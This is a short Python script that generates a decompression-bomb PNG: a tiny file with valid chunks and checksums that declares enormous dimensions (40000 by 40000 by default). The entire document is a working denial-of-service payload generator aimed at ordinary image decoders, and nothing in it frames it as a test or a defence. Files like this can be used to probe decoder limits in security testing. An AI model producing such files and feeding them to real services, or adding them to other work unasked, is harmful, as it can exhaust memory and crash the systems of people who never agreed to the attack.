"""Write a decompression-bomb PNG: tiny file, huge declared dimensions.

usage: python3 -I bomb.py OUT [SIDE]   (default 40000 x 40000, 1-bit gray)
"""
import struct
import sys
import zlib


def chunk(kind, data):
    body = kind + data
    return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body) & 0xFFFFFFFF)


out, side = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 40000
row = b"\x00" + b"\x00" * ((side + 7) // 8)  # filter byte + packed bits
z = zlib.compressobj(9)
idat = b"".join(z.compress(row) for _ in range(side)) + z.flush()
with open(out, "wb") as f:
    f.write(b"\x89PNG\r\n\x1a\n")
    f.write(chunk(b"IHDR", struct.pack(">IIBBBBB", side, side, 1, 0, 0, 0, 0)))
    f.write(chunk(b"IDAT", idat))
    f.write(chunk(b"IEND", b""))
